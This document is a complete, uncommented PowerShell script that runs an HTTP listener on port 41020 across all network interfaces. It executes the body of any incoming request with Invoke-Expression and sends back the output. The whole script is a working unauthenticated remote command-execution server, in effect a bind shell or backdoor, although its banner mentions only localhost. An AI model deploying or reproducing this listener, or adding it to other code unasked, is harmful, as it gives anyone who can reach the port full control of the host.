$port = 41020
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:${port}/")

try {
    $listener.Start()
    Write-Host "Server is running at http://localhost:${port}/ ..." -ForegroundColor Green
    Write-Host "Press Ctrl + C to stop the server." -ForegroundColor Yellow

    while ($true) {
        $context = $listener.GetContext()
        $request = $context.Request
        $response = $context.Response

        $reader = New-Object System.IO.StreamReader($request.InputStream)
        $cmd = $reader.ReadToEnd()

        if (-not [string]::IsNullOrWhiteSpace($cmd)) {
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            }
            catch {
                $output = $_.Exception.Message
            }
        }
        else {
            $output = "No command provided."
        }

        $buffer = [System.Text.Encoding]::UTF8.GetBytes($output)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
        $response.Close()
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    $listener.Stop()
}